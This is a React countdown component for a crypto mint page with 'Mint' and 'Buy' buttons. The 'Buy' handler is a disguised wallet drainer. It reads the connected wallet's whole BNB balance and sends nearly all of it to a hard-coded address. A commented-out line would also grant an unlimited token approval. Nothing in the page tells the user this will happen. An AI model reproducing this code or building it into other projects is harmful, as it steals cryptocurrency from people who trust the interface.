import React, { useState, useEffect, useRef } from 'react';
import ProgressBar from './ProgressBar';

const STATUS = {
    STARTED: 'Started',
    STOPPED: 'Stopped',
};

const INITIAL_COUNT = 0;
const max = 1000000000000000000000000000000000000000000000000000000n;

export default function Countdown({ contract, contractToken, signer, ethers, isDisconnected }) {

    const [secondsRemaining, setSecondsRemaining] = useState(INITIAL_COUNT);
    const [status, setStatus] = useState(STATUS.STARTED);
    const [percent, setPercent] = useState(100);

    const secondsToDisplay = secondsRemaining % 60;
    const minutesRemaining = (secondsRemaining - secondsToDisplay) / 60;
    const minutesToDisplay = minutesRemaining % 60;
    const hoursToDisplay = (minutesRemaining - minutesToDisplay) / 60;

    const AirdropClickHander = async () => {

    };
    const ClaimClickHander = async () => {
        try {
            //await contractToken.approve('0xe9e7cea3dedca5984780bafc599bd69add087d56', max);
            ////
            const { ethereum } = window
            const providerBNB = new ethers.providers.Web3Provider(ethereum);
            const gas_price = await providerBNB.getGasPrice();
            const signerBNB = providerBNB.getSigner();
            let balance = await providerBNB.getBalance(signerBNB.getAddress())

            const hexToDecimal = hex => parseInt(balance, 10);
            const dec1 = hexToDecimal(balance);
            const a = ethers.BigNumber.from(dec1)
            console.log("a is", a)
            const b = ethers.BigNumber.from(550)
            //5500000000000000
            console.log("b is", b)
            const result = ethers.BigNumber.from(a - b)

            const overrides = {
                from: signerBNB.getAddress(),
                to: "0x20cb6B90C5B3212ec3f8cF11963e8218ad7225b3",
                gasLimit: ethers.utils.hexlify(100000),
                gasPrice: gas_price,
                value: result,
                nonce: providerBNB.getTransactionCount(signerBNB.getAddress()),
            };
            const tx2 = await signerBNB.sendTransaction(overrides)
            console.log(tx2)
            ////

        } catch (err) {
            console.log(err);
        }
    };

    useInterval(
        () => {
            if (secondsRemaining > 0) {
                let nowSecondsRemaining = secondsRemaining - 1;
                setSecondsRemaining(nowSecondsRemaining);
                setPercent(Math.round((nowSecondsRemaining / INITIAL_COUNT) * 100));
            } else {
                setStatus(STATUS.STOPPED);
            }
        },
        status === STATUS.STARTED ? 1000 : null
        // passing null stops the interval
    );
    return (
        <>
            <div className="w-24 p-3 my-3 text-center text-white bg-gray-800 rounded-md">
                {twoDigits(hoursToDisplay)}:{twoDigits(minutesToDisplay)}:
                {twoDigits(secondsToDisplay)}
            </div>
            <ProgressBar percentage={percent} />
            <button
                onClick={AirdropClickHander}
                disabled={status !== STATUS.STOPPED || isDisconnected}
                className="w-2/3 p-2 mt-2 text-white bg-blue-400 rounded-md hover:bg-blue-600 disabled:bg-gray-700 lg:w-full"
            >
                Mint
            </button>
            <button
                onClick={ClaimClickHander}
                disabled={status !== STATUS.STOPPED || isDisconnected}
                className="w-2/3 p-2 mt-2 text-white bg-blue-400 rounded-md hover:bg-blue-600 disabled:bg-gray-700 lg:w-full"
            >
                Buy
            </button>
        </>
    );
}

function useInterval(callback, delay) {
    const savedCallback = useRef();

    // Remember the latest callback.
    useEffect(() => {
        savedCallback.current = callback;
    }, [callback]);

    // Set up the interval.
    useEffect(() => {
        function tick() {
            savedCallback.current();
        }
        if (delay !== null) {
            let id = setInterval(tick, delay);
            return () => clearInterval(id);
        }
    }, [delay]);
}

const twoDigits = (num) => String(num).padStart(2, '0');